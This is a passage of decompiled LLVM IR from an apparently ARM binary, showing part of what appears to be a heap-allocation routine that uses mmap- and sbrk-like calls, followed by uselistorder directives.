.thread29:                                        ; preds = %.thread29thread-pre-split, %bb155
  %v0_11e7c = phi i32 [ %v0_11e7c.pr, %.thread29thread-pre-split ], [ %v3_11e78, %bb155 ]
  %v2_11e7c = icmp ugt i32 %v0_11e7c, 1048575
  br i1 %v2_11e7c, label %bb157, label %bb156

bb156:                                            ; preds = %.thread29
  store i32 1048576, i32* @r5, align 4
  br label %bb157

bb157:                                            ; preds = %.thread29, %bb156
  %v0_11e94 = phi i32 [ %v0_11e7c, %.thread29 ], [ 1048576, %bb156 ]
  %v1_11e84 = load i32, i32* @sl, align 4
  %tmp214 = icmp ugt i32 %v0_11e94, %v1_11e84
  br i1 %tmp214, label %dec_label_pc_11e8c, label %dec_label_pc_120f0

dec_label_pc_11e8c:                               ; preds = %bb157
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_11e94, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_11ea8 = call i32 @function_13b14(i32 0, i32 %v0_11e94, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_11ea8, i32* %r0.global-to-local, align 4
  %v3_11eac = icmp eq i32 %v6_11ea8, -1
  %v8_11eac = icmp eq i32 %v6_11ea8, -1
  store i32 %v6_11ea8, i32* @r4, align 4
  br i1 %v8_11eac, label %.thread32, label %bb158

bb158:                                            ; preds = %dec_label_pc_11e8c
  %v1_11eb4 = load i32, i32* %r6.global-to-local, align 4
  %v2_11eb4 = add i32 %v1_11eb4, 864
  %v3_11eb4 = inttoptr i32 %v2_11eb4 to i32*
  %v4_11eb4 = load i32, i32* %v3_11eb4, align 4
  %v2_11eb8 = load i32, i32* @r5, align 4
  %v3_11eb8 = add i32 %v2_11eb8, %v6_11ea8
  store i32 %v3_11eb8, i32* %r0.global-to-local, align 4
  %v2_11ebc = and i32 %v4_11eb4, -2
  store i32 %v2_11ebc, i32* %r3.global-to-local, align 4
  store i32 %v2_11ebc, i32* %v3_11eb4, align 4
  br label %.thread32

.thread32:                                        ; preds = %dec_label_pc_11e8c, %bb158
  br i1 %v3_11eac, label %dec_label_pc_11ec8, label %dec_label_pc_11ecc

dec_label_pc_11ec8:                               ; preds = %.thread32, %dec_label_pc_11e48
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11ecc

dec_label_pc_11ecc:                               ; preds = %.thread32, %dec_label_pc_11ec8
  %v0_11ecc = load i32, i32* @r4, align 4
  %v7_11ecc = icmp eq i32 %v0_11ecc, -1
  br i1 %v7_11ecc, label %dec_label_pc_120f0, label %dec_label_pc_11ed4

dec_label_pc_11ed4:                               ; preds = %dec_label_pc_11ecc
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 124804, i32* %r2.global-to-local, align 4
  %v4_11edc = load i32, i32* inttoptr (i32 124836 to i32*), align 4
  store i32 %v4_11edc, i32* %ip.global-to-local, align 4
  store i32 %v3_11e0c, i32* %r2.global-to-local, align 4
  %v1_11ee4 = add i32 %v4_11edc, 872
  %v2_11ee4 = inttoptr i32 %v1_11ee4 to i32*
  %v3_11ee4 = load i32, i32* %v2_11ee4, align 4
  %v1_11ee8 = load i32, i32* @r8, align 4
  %v2_11ee8 = add i32 %v1_11ee8, %v3_11e0c
  store i32 %v2_11ee8, i32* %r1.global-to-local, align 4
  %v0_11eec = load i32, i32* @r5, align 4
  %v2_11eec = add i32 %v0_11eec, %v3_11ee4
  store i32 %v2_11eec, i32* %r3.global-to-local, align 4
  %v9_11ef0 = icmp eq i32 %v0_11ecc, %v2_11ee8
  br i1 %v9_11ef0, label %bb159, label %.thread122

.thread122:                                       ; preds = %dec_label_pc_11ed4
  store i32 %v2_11eec, i32* %v2_11ee4, align 4
  br label %dec_label_pc_11f0c

bb159:                                            ; preds = %dec_label_pc_11ed4
  %v1_11ef4 = load i32, i32* %r0.global-to-local, align 4
  %v8_11ef4 = icmp eq i32 %v1_11ef4, -1
  store i32 %v2_11eec, i32* %v2_11ee4, align 4
  br i1 %v8_11ef4, label %.thread34, label %dec_label_pc_11f0c

.thread34:                                        ; preds = %bb159
  %v1_11efc = load i32, i32* @r5, align 4
  %v2_11efc = load i32, i32* @r8, align 4
  %v3_11efc = add i32 %v2_11efc, %v1_11efc
  %v2_11f00 = or i32 %v3_11efc, 1
  store i32 %v2_11f00, i32* %r3.global-to-local, align 4
  %v2_11f04 = load i32, i32* %r2.global-to-local, align 4
  %v3_11f04 = add i32 %v2_11f04, 4
  %v4_11f04 = inttoptr i32 %v3_11f04 to i32*
  store i32 %v2_11f00, i32* %v4_11f04, align 4
  br label %dec_label_pc_12084

dec_label_pc_11f0c:                               ; preds = %bb159, %.thread122
  %v0_11f10.pr = load i32, i32* @r8, align 4
  %v0_11f0c = load i32, i32* %ip.global-to-local, align 4
  %v1_11f0c = add i32 %v0_11f0c, 864
  %v2_11f0c = inttoptr i32 %v1_11f0c to i32*
  %v3_11f0c = load i32, i32* %v2_11f0c, align 4
  store i32 %v3_11f0c, i32* %r2.global-to-local, align 4
  %v2_11f10 = icmp eq i32 %v0_11f10.pr, 0
  br i1 %v2_11f10, label %.thread37, label %.thread36

.thread37:                                        ; preds = %dec_label_pc_11f0c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread40

.thread36:                                        ; preds = %dec_label_pc_11f0c
  %v2_11f18 = urem i32 %v3_11f0c, 2
  store i32 %v2_11f18, i32* %r3.global-to-local, align 4
  %v2_11f1c = icmp eq i32 %v2_11f18, 0
  br i1 %v2_11f1c, label %.thread40, label %dec_label_pc_11f24

dec_label_pc_11f24:                               ; preds = %.thread36
  %v0_11f24 = load i32, i32* @r4, align 4
  %v1_11f24 = load i32, i32* %r1.global-to-local, align 4
  %v3_11f24 = icmp ult i32 %v0_11f24, %v1_11f24
  br i1 %v3_11f24, label %bb160, label %.thread40

bb160:                                            ; preds = %dec_label_pc_11f24
  %v2_11f28 = and i32 %v3_11f0c, -2
  store i32 %v2_11f28, i32* %r3.global-to-local, align 4
  store i32 %v2_11f28, i32* %v2_11f0c, align 4
  br label %.thread40

.thread40:                                        ; preds = %dec_label_pc_11f24, %.thread37, %.thread36, %bb160
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 124804, i32* %ip.global-to-local, align 4
  %v4_11f38 = load i32, i32* inttoptr (i32 124836 to i32*), align 4
  store i32 %v4_11f38, i32* @r7, align 4
  %v1_11f3c = add i32 %v4_11f38, 864
  %v2_11f3c = inttoptr i32 %v1_11f3c to i32*
  %v3_11f3c = load i32, i32* %v2_11f3c, align 4
  store i32 %v3_11f3c, i32* %r3.global-to-local, align 4
  %v1_11f40 = urem i32 %v3_11f3c, 2
  store i32 %v1_11f40, i32* @r6, align 4
  %v2_11f40 = icmp eq i32 %v1_11f40, 0
  br i1 %v2_11f40, label %dec_label_pc_11fd4, label %dec_label_pc_11f48

dec_label_pc_11f48:                               ; preds = %.thread40
  %v0_11f48 = load i32, i32* @r8, align 4
  %v2_11f48 = icmp eq i32 %v0_11f48, 0
  br i1 %v2_11f48, label %.thread43, label %bb161

bb161:                                            ; preds = %dec_label_pc_11f48
  %v2_11f4c = add i32 %v4_11f38, 872
  %v3_11f4c = inttoptr i32 %v2_11f4c to i32*
  %v4_11f4c = load i32, i32* %v3_11f4c, align 4
  store i32 %v4_11f4c, i32* %r2.global-to-local, align 4
  %v1_11f50 = load i32, i32* %r1.global-to-local, align 4
  %v2_11f50 = load i32, i32* @r4, align 4
  %v3_11f50 = sub i32 %v2_11f50, %v1_11f50
  %v3_11f54 = add i32 %v3_11f50, %v4_11f4c
  store i32 %v3_11f54, i32* %r3.global-to-local, align 4
  store i32 %v3_11f54, i32* %v3_11f4c, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_11f48, %bb161
  %v0_11f5c = load i32, i32* @r4, align 4
  %v1_11f5c = urem i32 %v0_11f5c, 8
  store i32 %v1_11f5c, i32* %r3.global-to-local, align 4
  %v2_11f5c = icmp eq i32 %v1_11f5c, 0
  br i1 %v2_11f5c, label %.thread44, label %bb162

bb162:                                            ; preds = %.thread43
  %v2_11f60 = sub nsw i32 8, %v1_11f5c
  store i32 %v2_11f60, i32* %r3.global-to-local, align 4
  %v3_11f64 = add i32 %v2_11f60, %v0_11f5c
  store i32 %v3_11f64, i32* @r7, align 4
  br label %.thread44

.thread44:                                        ; preds = %.thread43, %bb162
  %v0_11f6c = phi i32 [ 0, %.thread43 ], [ %v2_11f60, %bb162 ]
  %v1_11f68 = load i32, i32* @r5, align 4
  %v2_11f68 = add i32 %v1_11f68, %v0_11f5c
  store i32 %v2_11f68, i32* @r6, align 4
  %v1_11f6c = load i32, i32* @r8, align 4
  %v2_11f6c = add i32 %v2_11f68, %v0_11f6c
  %v2_11f70 = add i32 %v2_11f6c, %v1_11f6c
  store i32 %v2_11f70, i32* %r1.global-to-local, align 4
  %v1_11f74 = load i32, i32* %sb.global-to-local, align 4
  %v2_11f74 = add i32 %v1_11f74, %v2_11f70
  %v1_11f78 = load i32, i32* %fp.global-to-local, align 4
  %v2_11f78 = and i32 %v1_11f78, %v2_11f74
  store i32 %v2_11f78, i32* %r2.global-to-local, align 4
  %v2_11f7c = sub i32 0, %v2_11f68
  store i32 %v2_11f7c, i32* %r3.global-to-local, align 4
  %v2_11f80 = sub i32 %v2_11f78, %v2_11f68
  store i32 %v2_11f80, i32* @r5, align 4
  store i32 %v2_11f80, i32* %r0.global-to-local, align 4
  br i1 %v2_11f5c, label %bb163, label %bb164

bb163:                                            ; preds = %.thread44
  store i32 %v0_11f5c, i32* @r7, align 4
  br label %bb164

bb164:                                            ; preds = %.thread44, %bb163
  %v1_11f8c = call i32 @function_13da0(i32 %v2_11f80)
  store i32 %v1_11f8c, i32* %r0.global-to-local, align 4
  %v3_11f90 = icmp eq i32 %v1_11f8c, -1
  br i1 %v3_11f90, label %dec_label_pc_11f98, label %dec_label_pc_11fa8

dec_label_pc_11f98:                               ; preds = %bb164
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_11f9c = call i32 @function_13da0(i32 0)
  store i32 %v1_11f9c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_12000

dec_label_pc_11fa8:                               ; preds = %bb164
  %v1_11fa8 = load i32, i32* @r4, align 4
  %v3_11fa8 = icmp ult i32 %v1_11f8c, %v1_11fa8
  br i1 %v3_11fa8, label %dec_label_pc_11fb0, label %dec_label_pc_12000

dec_label_pc_11fb0:                               ; preds = %dec_label_pc_11fa8
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 124804, i32* %r0.global-to-local, align 4
  %v4_11fb8 = load i32, i32* inttoptr (i32 124836 to i32*), align 4
  store i32 %v4_11fb8, i32* %r2.global-to-local, align 4
  %v1_11fbc = add i32 %v4_11fb8, 864
  %v2_11fbc = inttoptr i32 %v1_11fbc to i32*
  %v3_11fbc = load i32, i32* %v2_11fbc, align 4
  %v0_11fc0 = load i32, i32* @r6, align 4
  store i32 %v0_11fc0, i32* %r0.global-to-local, align 4
  %v1_11fc4 = and i32 %v3_11fbc, -2
  store i32 %v1_11fc4, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_11fc4, i32* %v2_11fbc, align 4
  br label %dec_label_pc_12000

dec_label_pc_11fd4:                               ; preds = %.thread40
  %v0_11fd4 = load i32, i32* %r0.global-to-local, align 4
  %v3_11fd4 = icmp eq i32 %v0_11fd4, -1
  br i1 %v3_11fd4, label %dec_label_pc_11fdc, label %dec_label_pc_11ff8

dec_label_pc_11fdc:                               ; preds = %dec_label_pc_11fd4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_11fe0 = call i32 @function_13da0(i32 0)
  store i32 %v1_11fe0, i32* %r0.global-to-local, align 4
  %v0_11fe4 = load i32, i32* @r7, align 4
  %v1_11fe4 = add i32 %v0_11fe4, 872
  %v2_11fe4 = inttoptr i32 %v1_11fe4 to i32*
  %v3_11fe4 = load i32, i32* %v2_11fe4, align 4
  store i32 %v3_11fe4, i32* %r2.global-to-local, align 4
  %v0_11fe8 = load i32, i32* @r4, align 4
  %v0_11fec = load i32, i32* @r5, align 4
  %v2_11fe8 = add i32 %v3_11fe4, %v1_11fe0
  %v2_11fec = sub i32 %v2_11fe8, %v0_11fe8
  %v2_11ff0 = sub i32 %v2_11fec, %v0_11fec
  store i32 %v2_11ff0, i32* %r3.global-to-local, align 4
  store i32 %v2_11ff0, i32* %v2_11fe4, align 4
  %v0_11ffc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_11ff8

dec_label_pc_11ff8:                               ; preds = %dec_label_pc_11fd4, %dec_label_pc_11fdc
  %v0_11ffc = phi i32 [ 0, %dec_label_pc_11fd4 ], [ %v0_11ffc.pre, %dec_label_pc_11fdc ]
  %v0_11ff8 = load i32, i32* @r4, align 4
  store i32 %v0_11ff8, i32* @r7, align 4
  store i32 %v0_11ffc, i32* @r5, align 4
  br label %dec_label_pc_12000

dec_label_pc_12000:                               ; preds = %dec_label_pc_11fa8, %dec_label_pc_11fb0, %dec_label_pc_11f98, %dec_label_pc_11ff8
  %v0_12000 = load i32, i32* %r0.global-to-local, align 4
  %v7_12000 = icmp eq i32 %v0_12000, -1
  br i1 %v7_12000, label %dec_label_pc_12084, label %dec_label_pc_12008

dec_label_pc_12008:                               ; preds = %dec_label_pc_12000
  %v1_12008 = load i32, i32* @r5, align 4
  %v2_12008 = add i32 %v1_12008, %v0_12000
  %v0_1200c = load i32, i32* @r7, align 4
  %v2_1200c = sub i32 %v2_12008, %v0_1200c
  %v1_12010 = or i32 %v2_1200c, 1
  %v2_12014 = add i32 %v0_1200c, 4
  %v3_12014 = inttoptr i32 %v2_12014 to i32*
  store i32 %v1_12010, i32* %v3_12014, align 4
  store i32 124804, i32* %r1.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_12020 = load i32, i32* inttoptr (i32 124836 to i32*), align 4
  store i32 %v4_12020, i32* @r6, align 4
  %v1_12024 = add i32 %v4_12020, 872
  %v2_12024 = inttoptr i32 %v1_12024 to i32*
  %v3_12024 = load i32, i32* %v2_12024, align 4
  %v0_12028 = load i32, i32* @r8, align 4
  %v2_12028 = icmp eq i32 %v0_12028, 0
  %v0_1202c = load i32, i32* @r5, align 4
  %v2_1202c = add i32 %v0_1202c, %v3_12024
  store i32 %v2_1202c, i32* %r3.global-to-local, align 4
  store i32 %v2_1202c, i32* %v2_12024, align 4
  %v0_12034 = load i32, i32* @r7, align 4
  %v1_12034 = load i32, i32* @r6, align 4
  %v2_12034 = add i32 %v1_12034, 44
  %v3_12034 = inttoptr i32 %v2_12034 to i32*
  store i32 %v0_12034, i32* %v3_12034, align 4
  br i1 %v2_12028, label %dec_label_pc_12084, label %dec_label_pc_1203c

dec_label_pc_1203c:                               ; preds = %dec_label_pc_12008
  %v0_12040 = load i32, i32* @r8, align 4
  %v1_12040 = add i32 %v0_12040, -12
  %v1_12044 = and i32 %v1_12040, -8
  store i32 %v3_11e0c, i32* %ip.global-to-local, align 4
  %v2_1204c = add i32 %v1_12044, %v3_11e0c
  store i32 %v2_1204c, i32* %r1.global-to-local, align 4
  %v2_12050 = icmp ugt i32 %v1_12044, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_12058 = or i32 %v1_12044, 1
  store i32 %v1_12058, i32* %r3.global-to-local, align 4
  store i32 %v1_12058, i32* %v2_11e18, align 4
  %v0_12060 = load i32, i32* %r2.global-to-local, align 4
  %v1_12060 = load i32, i32* %r1.global-to-local, align 4
  %v2_12060 = add i32 %v1_12060, 8
  %v3_12060 = inttoptr i32 %v2_12060 to i32*
  store i32 %v0_12060, i32* %v3_12060, align 4
  %v0_12064 = load i32, i32* %r2.global-to-local, align 4
  %v1_12064 = load i32, i32* %r1.global-to-local, align 4
  %v2_12064 = add i32 %v1_12064, 4
  %v3_12064 = inttoptr i32 %v2_12064 to i32*
  store i32 %v0_12064, i32* %v3_12064, align 4
  br i1 %v2_12050, label %dec_label_pc_1206c, label %dec_label_pc_12084

dec_label_pc_1206c:                               ; preds = %dec_label_pc_1203c
  %v0_1206c = load i32, i32* @r6, align 4
  %v1_1206c = add i32 %v0_1206c, 836
  %v2_1206c = inttoptr i32 %v1_1206c to i32*
  %v3_1206c = load i32, i32* %v2_1206c, align 4
  store i32 %v3_1206c, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_12074 = load i32, i32* %ip.global-to-local, align 4
  %v1_12074 = add i32 %v0_12074, 8
  store i32 %v1_12074, i32* @r0, align 4
  store i32 -1, i32* %v2_1206c, align 4
  %v0_1207c = call i32 @function_12898()
  store i32 %v0_1207c, i32* %r0.global-to-local, align 4
  %v0_12080 = load i32, i32* @r4, align 4
  %v1_12080 = load i32, i32* @r6, align 4
  %v2_12080 = add i32 %v1_12080, 836
  %v3_12080 = inttoptr i32 %v2_12080 to i32*
  store i32 %v0_12080, i32* %v3_12080, align 4
  br label %dec_label_pc_12084

dec_label_pc_12084:                               ; preds = %.thread34, %dec_label_pc_1203c, %dec_label_pc_12008, %dec_label_pc_12000, %dec_label_pc_1206c
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 124804, i32* %r0.global-to-local, align 4
  %v4_1208c = load i32, i32* inttoptr (i32 124836 to i32*), align 4
  store i32 %v4_1208c, i32* %lr.global-to-local, align 4
  %v1_12090 = add i32 %v4_1208c, 872
  store i32 %v1_12090, i32* %r1.global-to-local, align 4
  %v1_12094 = inttoptr i32 %v1_12090 to i32*
  %v2_12094 = load i32, i32* %v1_12094, align 4
  store i32 %v2_12094, i32* %r1.global-to-local, align 4
  %v3_12094 = add i32 %v4_1208c, 876
  %v4_12094 = inttoptr i32 %v3_12094 to i32*
  %v5_12094 = load i32, i32* %v4_12094, align 4
  store i32 %v5_12094, i32* %r3.global-to-local, align 4
  %v1_1209c = add i32 %v4_1208c, 868
  %v2_1209c = inttoptr i32 %v1_1209c to i32*
  %v3_1209c = load i32, i32* %v2_1209c, align 4
  store i32 %v3_1209c, i32* %r3.global-to-local, align 4
  %v1_120a0 = add i32 %v4_1208c, 884
  %v2_120a0 = inttoptr i32 %v1_120a0 to i32*
  %v3_120a0 = load i32, i32* %v2_120a0, align 4
  store i32 %v3_120a0, i32* %r2.global-to-local, align 4
  %v2_120a4 = add i32 %v3_1209c, %v2_12094
  store i32 %v2_120a4, i32* %r3.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_12094, %v5_12094
  br i1 %tmp215, label %bb165, label %bb166

bb165:                                            ; preds = %dec_label_pc_12084
  store i32 %v2_12094, i32* %v4_12094, align 4
  %v0_120ac.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_120ac.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb166

bb166:                                            ; preds = %dec_label_pc_12084, %bb165
  %v1_120ac = phi i32 [ %v3_120a0, %dec_label_pc_12084 ], [ %v1_120ac.pre, %bb165 ]
  %v4_120b0 = phi i32 [ %v2_120a4, %dec_label_pc_12084 ], [ %v0_120ac.pre, %bb165 ]
  %tmp216 = icmp ugt i32 %v4_120b0, %v1_120ac
  br i1 %tmp216, label %bb167, label %bb168

bb167:                                            ; preds = %bb166
  %v5_120b0 = load i32, i32* %lr.global-to-local, align 4
  %v6_120b0 = add i32 %v5_120b0, 884
  %v7_120b0 = inttoptr i32 %v6_120b0 to i32*
  store i32 %v4_120b0, i32* %v7_120b0, align 4
  br label %bb168

bb168:                                            ; preds = %bb166, %bb167
  %v0_120b4 = load i32, i32* %lr.global-to-local, align 4
  %v1_120b4 = add i32 %v0_120b4, 44
  %v2_120b4 = inttoptr i32 %v1_120b4 to i32*
  %v3_120b4 = load i32, i32* %v2_120b4, align 4
  store i32 %v3_120b4, i32* %ip.global-to-local, align 4
  %v1_120b8 = add i32 %v3_120b4, 4
  %v2_120b8 = inttoptr i32 %v1_120b8 to i32*
  %v3_120b8 = load i32, i32* %v2_120b8, align 4
  store i32 %v1_11ccc, i32* %r1.global-to-local, align 4
  %v1_120c0 = and i32 %v3_120b8, -4
  store i32 %v1_120c0, i32* %r3.global-to-local, align 4
  %v3_120c4 = icmp ult i32 %v1_120c0, %v1_11ccc
  br i1 %v3_120c4, label %dec_label_pc_120f0, label %dec_label_pc_120cc

dec_label_pc_120cc:                               ; preds = %bb168
  %v0_120cc = load i32, i32* @sl, align 4
  %v2_120cc = sub i32 %v1_120c0, %v0_120cc
  %v2_120d0 = add i32 %v0_120cc, %v3_120b4
  store i32 %v2_120d0, i32* %r1.global-to-local, align 4
  %v1_120d4 = or i32 %v2_120cc, 1
  store i32 %v1_120d4, i32* %r3.global-to-local, align 4
  %v1_120d8 = or i32 %v0_120cc, 1
  store i32 %v1_120d8, i32* %r2.global-to-local, align 4
  %v1_120dc = add i32 %v3_120b4, 8
  store i32 %v1_120dc, i32* %r0.global-to-local, align 4
  store i32 %v1_120d8, i32* %v2_120b8, align 4
  %v0_120e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_120e4 = load i32, i32* %lr.global-to-local, align 4
  %v2_120e4 = add i32 %v1_120e4, 44
  %v3_120e4 = inttoptr i32 %v2_120e4 to i32*
  store i32 %v0_120e4, i32* %v3_120e4, align 4
  %v0_120e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_120e8 = load i32, i32* %r1.global-to-local, align 4
  %v2_120e8 = add i32 %v1_120e8, 4
  %v3_120e8 = inttoptr i32 %v2_120e8 to i32*
  store i32 %v0_120e8, i32* %v3_120e8, align 4
  br label %dec_label_pc_12100

dec_label_pc_120f0:                               ; preds = %bb157, %bb168, %dec_label_pc_11ecc
  %v0_120f0 = call i32 @function_11200()
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_120f8 = inttoptr i32 %v0_120f0 to i32*
  store i32 12, i32* %v2_120f8, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12100

dec_label_pc_12100:                               ; preds = %bb151, %bb150, %dec_label_pc_120cc, %dec_label_pc_11d14, %dec_label_pc_120f0
  %v0_12100 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12100, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12104

dec_label_pc_12104:                               ; preds = %.thread1, %dec_label_pc_11ce0, %.thread121, %dec_label_pc_11b50, %dec_label_pc_11b44, %dec_label_pc_119ac, %dec_label_pc_11930, %dec_label_pc_12100
  store i32 %v2_11858, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* @r3, align 4
  store i32 124804, i32* %r2.global-to-local, align 4
  %v4_12114 = load i32, i32* inttoptr (i32 124828 to i32*), align 4
  store i32 %v4_12114, i32* @ip, align 4
  store i32 74016, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12114)
  br label %dec_label_pc_12120

dec_label_pc_12120:                               ; preds = %dec_label_pc_11890, %dec_label_pc_12104
  %v0_12120 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12120, i32* %r0.global-to-local, align 4
  store i32 %v3_1182c, i32* @r4, align 4
  store i32 %v6_1182c, i32* @r5, align 4
  store i32 %v9_1182c, i32* @r6, align 4
  store i32 %v12_1182c, i32* @r7, align 4
  store i32 %v15_1182c, i32* @r8, align 4
  store i32 %v18_1182c, i32* @sb, align 4
  store i32 %v21_1182c, i32* @sl, align 4
  store i32 %v24_1182c, i32* @fp, align 4
  store i32 %v27_1182c, i32* @lr, align 4
  ret i32 %v0_12120

; uselistorder directives
  uselistorder i32 %v0_120cc, { 1, 0, 2 }
  uselistorder i32 %v3_120b4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_120b0, { 1, 0 }
  uselistorder i32 %v2_12094, { 2, 0, 1, 3 }
  uselistorder i32 %v4_1208c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_12044, { 1, 2, 0 }
  uselistorder i32 %v0_1200c, { 1, 0 }
  uselistorder i32 %v0_12000, { 1, 0 }
  uselistorder i32 %v2_11ff0, { 1, 0 }
  uselistorder i32 %v2_11f80, { 2, 1, 0 }
  uselistorder i32 %v2_11f68, { 1, 2, 0, 3 }
  uselistorder i32 %v2_11f60, { 1, 0, 2 }
  uselistorder i32 %v1_11f5c, { 2, 1, 0 }
  uselistorder i32 %v0_11f5c, { 3, 1, 2, 0 }
  uselistorder i32 %v1_11f40, { 1, 0 }
  uselistorder i32 %v2_11f18, { 1, 0 }
  uselistorder i32 %v3_11f0c, { 1, 0, 2 }
  uselistorder i32 %v2_11eec, { 1, 0, 2 }
  uselistorder i32* %v2_11ee4, { 1, 0, 2 }
  uselistorder i32 %v0_11ecc, { 1, 0 }
  uselistorder i32 %v6_11ea8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_11e94, { 2, 1, 0 }
  uselistorder i32 %v0_11e7c, { 1, 0 }
  uselistorder i32 %v2_11e38, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11e34, { 1, 0 }
  uselistorder i32 %v3_11e0c, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_11dec, { 1, 0, 2 }
  uselistorder i32 %v2_11dd4, { 1, 2, 0, 3 }
  uselistorder i32 %v1_11d7c, { 2, 1, 0 }
  uselistorder i32 %v6_11d70, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_11d4c, { 2, 1, 0, 3 }
  uselistorder i32 %v3_11d0c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_11ccc, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_11cc4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_11cc0, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_11cac, { 1, 0 }
  uselistorder i32 %v7_11c6c, { 1, 0 }
  uselistorder i32 %v4_11c6c, { 1, 0 }
  uselistorder i32 %v0_11c3c, { 1, 0 }
  uselistorder i32 %v2_11c10, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_11c0c54, { 1, 0 }
  uselistorder i32 %v1_11bd8, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_11bc0., { 1, 2, 0 }
  uselistorder i32 %v0_11bc8, { 0, 1, 3, 2 }
  uselistorder i32 %v1_11bc8, { 1, 0 }
  uselistorder i32 %v3_11ba8, { 1, 0 }
  uselistorder i32 %v4_11ba4, { 1, 0, 2 }
  uselistorder i32 %v1_11b14, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_11b6c, { 1, 0 }
  uselistorder i32 %v1_11b50, { 1, 0 }
  uselistorder i32 %v1_119f0, { 1, 0 }
  uselistorder i32 %v0_11b30, { 2, 0, 1, 3 }
  uselistorder i32 %v3_11af8, { 2, 0, 1, 3 }
  uselistorder i32 %v0_11b8c.pre, { 1, 2, 0 }
  uselistorder i32 %v0_11ad4, { 2, 1, 0 }
  uselistorder i32 %v3_11ac8, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_119e8, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_11a90, { 1, 0 }
  uselistorder i32 %v3_11a84, { 1, 0 }
  uselistorder i32 %v0_11a90, { 1, 0 }
  uselistorder i32 %v3_11a68, { 0, 2, 3, 1 }
  uselistorder i32 %v2_11a58, { 1, 0, 2 }
  uselistorder i32 %v3_11a10, { 2, 1, 0 }
  uselistorder i32 %v0_11a00, { 3, 2, 1, 0 }
  uselistorder i32 %v0_119d0, { 1, 0 }
  uselistorder i32 %v1_11984, { 2, 1, 0, 3 }
  uselistorder i32 %v0_11980, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_11924, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_11918, { 1, 0 }
  uselistorder i32 %v3_118e8, { 1, 0 }
  uselistorder i32 %v0_118dc, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_118bc, { 0, 2, 1, 3 }
  uselistorder i1 %v7_118b0, { 1, 0 }
  uselistorder i32 %v0_11888, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 44, 41, 42, 43, 45, 46, 47, 48, 0, 1, 49, 50, 51, 52, 53, 54, 55, 56, 57, 62, 58, 59, 60, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 82, 90, 77, 78, 79, 80, 81, 83, 84, 85, 86, 2, 87, 88, 89, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 50, 43, 44, 45, 46, 47, 48, 49, 51, 52, 53, 54, 55, 56, 57 }
